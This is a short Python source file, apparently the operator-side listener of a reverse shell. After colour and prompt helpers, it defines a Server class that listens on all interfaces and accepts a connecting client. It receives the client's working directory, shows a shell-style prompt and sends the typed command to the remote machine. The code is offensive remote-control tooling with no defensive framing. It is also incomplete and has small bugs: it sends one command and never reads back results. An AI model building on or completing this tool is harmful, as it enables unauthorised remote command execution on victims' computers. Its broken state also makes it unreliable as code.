import socket, os
from colorama import *
from os import system, getenv, name
## set the clear command by os name
windows = False
if name == 'nt': ## windows
    def clear():
        widows = True
        system('cls')
else: ## linux distrib.
    def clear():
        system('clear')




## init colorama to dodge the problems
init()

## set colors more simple :)

red = Fore.RED
lightRed = Fore.LIGHTRED_EX

blue = Fore.BLUE
lightBlue = Fore.LIGHTBLUE_EX

green = Fore.GREEN
lightGreen = Fore.LIGHTGREEN_EX

yellow = Fore.YELLOW
lightYellow = Fore.LIGHTYELLOW_EX

magenta = Fore.MAGENTA
lightMagenta = Fore.LIGHTMAGENTA_EX

cyan = Fore.CYAN
lightCyan = Fore.LIGHTCYAN_EX

white = Fore.RESET

black = Fore.BLACK

reset = Fore.RESET

## set usefull vars

attention = f'{reset}[{yellow}!{reset}] '
info = f'{reset}[{cyan}*{reset}] '
ok = f'{reset}[{lightGreen}ok{reset}] '
success = f'{reset}[{green}v{reset}] '
error = f'{reset}[{yellow}!{reset}] '
question = f'{reset}[{lightGreen}?{reset}] '

class Server:
    def start(self, port, SERVER_HOST="0.0.0.0"):

        print(f"{info}Server started")

        BUFFER_SIZE = 1024 * 128
        SEPARATOR = "<sep>"

        s = socket.socket()
        s.bind((SERVER_HOST, port))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.listen(5)
        print(f"{success}Listening  on  {magenta}{SERVER_HOST}:{port}{reset}")
        client_socket, client_address = s.accept()
        print(f"{success}{cyan}{client_address[0]}:{client_address[1]} Connected")
        currentWorkingDirectory = client_socket.recv(BUFFER_SIZE).decode()
        cmd = input(f"{cyan}{currentWorkingDirectory} $> ")

        if not cmd.strip():
            pass
        client_socket.send(cmd.encode())

